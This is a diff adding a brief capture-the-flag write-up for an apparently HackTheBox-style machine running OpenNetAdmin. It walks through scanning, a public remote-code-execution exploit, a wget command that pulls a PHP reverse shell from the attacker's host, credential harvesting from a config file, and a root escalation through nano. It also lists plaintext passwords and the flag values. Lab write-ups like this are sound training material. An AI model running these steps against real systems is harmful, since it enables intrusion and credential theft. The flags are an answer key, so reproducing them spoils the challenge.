@@ -1,0 +1,23 @@
+From nmap scans we get that we have only two ports open, 22 and 80
+
+On the 80 port is only a default page from apache2 installation, so we need to search it using gobuster [ gobuster dir --url=http://10.10.10.171/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  ]
+Here we get the `/music` endpoint, with a html page. Checking the links we get the `/ona` which is a documented software. OpenNetAdmin 18.1.1 has a remote code execution cve. 
+Get the code and run it. Here we get a way to input commands. First, we should get the Pentestmonkey's php revese shell.
+Now we upload it to the box using `wget http://10.10.14.47/backdoor2.php` and than access the url link `http://10.10.10.171/ona/backdoor2.php` and we have the low priv shell.
+Searching through files we get in `local/config/database_settings.inc.php` a set of credentials which are for the database, as well as for the ssh user jimmy. 
+To escalate we first search through directories, and we get the path that has `/var/www/internal`. Here is an interesting file, called `main.php`. From this one, we know that is running internal, so we find the port used, `netstat -tulpn | grep LISTEN`, and we find, by trial and error that is running on 52846. Now we make a request, `curl http://localhost:52846/main.php` and we got the ssh private key. Here we crack it and we got the credentials.
+We have the user.
+
+Root is just gtfobins on nano. 
+
+
+Users
+-> jimmy:n1nj4W4rri0R!
+-> joanna:bloodninjas
+
+Flags
+-> USER: c9b2cf07d40807e62af62660f0c81b5f
+-> ROOT: 2f907ed450b361b2c2bf4e8795d5b561
+
+Articles
+-> https://packetstormsecurity.com/files/146184/systemd-Local-Privilege-Escalation.html
